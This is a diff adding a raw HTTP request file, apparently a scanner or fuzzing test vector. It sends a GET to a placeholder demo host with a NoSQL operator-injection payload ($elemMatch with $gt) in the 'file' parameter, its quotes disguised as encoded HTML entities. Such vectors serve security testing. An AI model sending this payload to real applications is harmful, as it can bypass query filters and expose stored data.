@@ -1,0 +1,4 @@
+GET /a?file={%26%23x22;$elemMatch%26%23x22;:{%26%23x22;$gt%26%23x22;:0}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
